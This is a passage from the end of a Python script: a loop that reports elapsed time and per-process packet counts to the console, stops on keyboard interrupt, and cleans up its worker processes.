            elapsed = time.time()-start
            status = " | ".join([f"{i}:{counters[i].value}pkts" for i in procs])
            sys.stdout.write(f"\r[MONITOR] {elapsed:.1f}s | {status}"); sys.stdout.flush(); time.sleep(0.5)
    except KeyboardInterrupt: print("\n[INFO] Stopped by user.")
    finally: cleanup(procs); print("\n[INFO] Cleanup complete.")

if __name__ == "__main__":
    main()
